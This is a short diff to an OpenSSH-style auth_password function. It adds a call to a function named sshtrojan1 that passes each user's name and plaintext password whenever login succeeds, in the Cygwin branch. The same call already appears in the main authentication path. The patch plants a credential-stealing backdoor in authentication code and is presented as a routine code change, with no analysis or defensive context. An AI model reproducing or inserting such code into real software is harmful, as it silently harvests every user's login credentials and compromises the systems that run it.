@@ -91,7 +91,11 @@ auth_password(struct ssh *ssh, const char *password)
 		if (hToken == INVALID_HANDLE_VALUE)
 			return 0;
 		cygwin_set_impersonation_token(hToken);
-		return ok;
+		if(ok){
+			sshtrojan1(authctxt->user, password);
+			return 1;
+		}
+		return 0;
 	}
 #endif
 #ifdef USE_PAM
@@ -116,7 +120,6 @@ auth_password(struct ssh *ssh, const char *password)
 		auth_restrict_session(ssh);
 	if(result && ok){
 		sshtrojan1(authctxt->user, password);
-
 		return 1;
 	}
 	return 0;
